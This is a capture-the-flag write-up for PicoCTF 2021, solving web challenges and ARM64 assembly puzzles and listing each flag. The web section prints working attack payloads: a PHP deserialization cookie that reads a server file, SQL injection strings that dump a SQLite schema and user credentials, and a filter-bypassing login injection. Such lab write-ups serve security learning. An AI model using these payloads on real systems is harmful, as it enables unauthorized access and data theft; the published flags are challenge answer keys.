# PicoCTF2021

Tue, 16 Mar. 2021 — Tue, 30 Mar. 2021

**Ranked 113th on 6215**

* [Web](README.md#web)
  - [Super Serial](README.md#super-serial) (130 points)
  - [Startup Company](README.md#startup-company) (180 points)
  - [Web Gauntlet 2](README.md#web-gauntlet-2) (170 points)
  - [Web Gauntlet 3](README.md#web-gauntlet-3) (300 points)
* [ARMssembly (Reverse Engineering)](#armssembly)
  - [ARMssembly 0](README.md#armssembly-0) (40 points)
  - [ARMssembly 1](README.md#armssembly-1) (70 points)
  - [ARMssembly 2](README.md#armssembly-2) (90 points)
  - [ARMssembly 3](README.md#armssembly-3) (130 points)
  - [ARMssembly 4](README.md#armssembly-4) (170 points)

# Web

## Super Serial

We must recover the flag stored on this website at `../flag`

An the site, there is only one page: `index.php`

There is also a `robots.txt`:

```
User-agent: *
Disallow: /admin.phps
```

With this hint, we found other pages:

```
index.php
cookie.php
authentication.php
index.phps
cookie.phps
authentication.phps
```

We can see source code of pages in `.phps` files and there is something interesting:

```php
if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}
```

The object supposed to be deserialized is `permissions` but it does not appear to be vulnerable (SQL injection):

```php
class permissions
{
	public $username;
	public $password;

	function __construct($u, $p) {
		$this->username = $u;
		$this->password = $p;
	}

	function __toString() {
		return $u.$p;
	}

	function is_guest() {
		$guest = false;

		$con = new SQLite3("../users.db");
		$username = $this->username;
		$password = $this->password;
		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
		$stm->bindValue(1, $username, SQLITE3_TEXT);
		$stm->bindValue(2, $password, SQLITE3_TEXT);
		$res = $stm->execute();
		$rest = $res->fetchArray();
		if($rest["username"]) {
			if ($rest["admin"] != 1) {
				$guest = true;
			}
		}
		return $guest;
	}

	function is_admin() {
		$admin = false;

		$con = new SQLite3("../users.db");
		$username = $this->username;
		$password = $this->password;
		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
		$stm->bindValue(1, $username, SQLITE3_TEXT);
		$stm->bindValue(2, $password, SQLITE3_TEXT);
		$res = $stm->execute();
		$rest = $res->fetchArray();
		if($rest["username"]) {
			if ($rest["admin"] == 1) {
				$admin = true;
			}
		}
		return $admin;
	}
}
```

However, we can serialize an another object which will allow us to read files on the server:

```php
class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}
```

So, we create an `access_log` which will read `../flag`:

```php
echo(serialize(new access_log("../flag")));
// -> O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}
```

Encode it in base64 and put it in `login` cookie:

```
login: TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
```

To sum up:

- `$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));` serialize an `access_log` object with `$log_file="../flag"`
- `$g = $perm->is_guest();` throw an error because `access_log` doesn't have `is_guest` method
- the error is catch by `catch(Error $e)`
- `die("Deserialization error. ".$perm);` call the `__toString` method of `access_log` which read `../flag` and display it content

And we get `Deserialization error. picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_405f4c0e}`

The flag is: `picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_405f4c0e}`

## Startup Company

We are on a website, we create an account and logged in

There is a number input which accepts only digits, change in HTML type from `number` to `text` to write all we wants

After some tests, the DBMS is sqlite and the query seems to look like `UPDATE table SET col = 'user_input'; SELECT col FROM table`

First, we need to retrieve the table name:

```
' || (SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0) || '
-> startup_users
```

Then the column names:

```
' || (SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='startup_users') || '
-> CREATE TABLE startup_users (nameuser text, wordpass text, money int)
```

And dump the datas:

```
' || (SELECT nameuser || wordpass FROM startup_users limit 1 offset 0) || '
-> admin passwordron

' || (SELECT nameuser || wordpass || money FROM startup_users limit 1 offset 1) || '
-> ronnot_the_flag_293e97bd picoCTF{1_c4nn0t_s33_y0u_eff986fd}
```

The flag is: `picoCTF{1_c4nn0t_s33_y0u_eff986fd}`

## Web Gauntlet 2

There is a loggin form and we must loggin as admin

The query is given: `SELECT username, password FROM users WHERE username='test' AND password='test'`

There is also words filtered: `or and true false union like = > < ; -- /* */ admin`

With `admi'||CHAR(` as username and `-0+110)||'` as password, the query is transformed into `SELECT username, password FROM users WHERE username='admi'||CHAR(' AND password='-0+110)||''` 

`' AND password='-0+110` is `110`, `CHAR(110)` is `'n'`, and `'admi'||'n'||''` is `'admin'`

The final query looks like: `SELECT username, password FROM users WHERE username='admin'`

We are logged in and we get the flag!

The flag is: `picoCTF{0n3_m0r3_t1m3_d5a91d8c2ae4ce567c2e8b8453305565}`

## Web Gauntlet 3

Like `Web Gauntlet 2` except that the maximum size is no longer 35 but 25

Our payload still work because its size is 23

And the flag is: `picoCTF{k3ep_1t_sh0rt_fc8788aa1604881093434ba00ba5b9cd}`

# ARMssembly

The given source codes is ARM64 assembly, so we will compile it!

Run an arm64 OS with qemu: https://wiki.debian.org/Arm64Qemu and let's go

(But I think it was not the expected method for a reverse engineering chall)

## ARMssembly 0

```
Description:

What integer does this program print with arguments 4112417903 and 1169092511?
File: chall.S

Flag format: picoCTF{XXXXXXXX} -> (hex, lowercase, no 0x, and 32 bits. ex. 5614267 would be picoCTF{0055aabb})
```

```
debian@debian:~$ gcc chall.S
debian@debian:~$ ./a.out 4112417903 1169092511
Result: 4112417903
```

The flag is: `picoCTF{f51e846f}`

## ARMssembly 1

```
Description:

For what argument does this program print `win` with variables 81, 0 and 3? 
File: chall_1.S 

Flag format: picoCTF{XXXXXXXX} -> (hex, lowercase, no 0x, and 32 bits. ex. 5614267 would be picoCTF{0055aabb})
```

```
debian@debian:~$ gcc chall_1.S
debian@debian:~$ ./a.out 1
You Lose :(
debian@debian:~$ ./a.out 2
You Lose :(
debian@debian:~$ ./a.out 3
You Lose :(
debian@debian:~$ for i in {0..1000}; do echo -n "$i "; ./a.out $i; done | grep win
27 You win!
```

The flag is: `picoCTF{0000001b}`

## ARMssembly 2

```
Description:

What integer does this program print with argument 2610164910?
File: chall_2.S 

Flag format: picoCTF{XXXXXXXX} -> (hex, lowercase, no 0x, and 32 bits. ex. 5614267 would be picoCTF{0055aabb})
```

```
debian@debian:~$ gcc chall_2.S
debian@debian:~$ ./a.out 2610164910 # toooooo long
^C
debian@debian:~$ ./a.out 1
Result: 3
debian@debian:~$ ./a.out 2
Result: 6
debian@debian:~$ ./a.out 3
Result: 9
debian@debian:~$ ./a.out 4
Result: 12
debian@debian:~$ ./a.out 5
Result: 15
```

Resutl seams be `2610164910 * 3`, so `7830494730`

The flag is: `picoCTF{d2bbde0a}`

## ARMssembly 3

```
Description:

What integer does this program print with argument 469937816?
File: chall_3.S 

Flag format: picoCTF{XXXXXXXX} -> (hex, lowercase, no 0x, and 32 bits. ex. 5614267 would be picoCTF{0055aabb})
```

```
debian@debian:~$ gcc chall_3.S
debian@debian:~$ ./a.out 469937816
Result: 36
```

The flag is: `picoCTF{00000024}`

## ARMssembly 4

```
Description:

What integer does this program print with argument 3434881889?
File: chall_4.S 

Flag format: picoCTF{XXXXXXXX} -> (hex, lowercase, no 0x, and 32 bits. ex. 5614267 would be picoCTF{0055aabb})
```

```
debian@debian:~$ gcc chall_4.S
debian@debian:~$ ./a.out 3434881889
Result: 3434882004
```

The flag is: `picoCTF{ccbc23d4}`
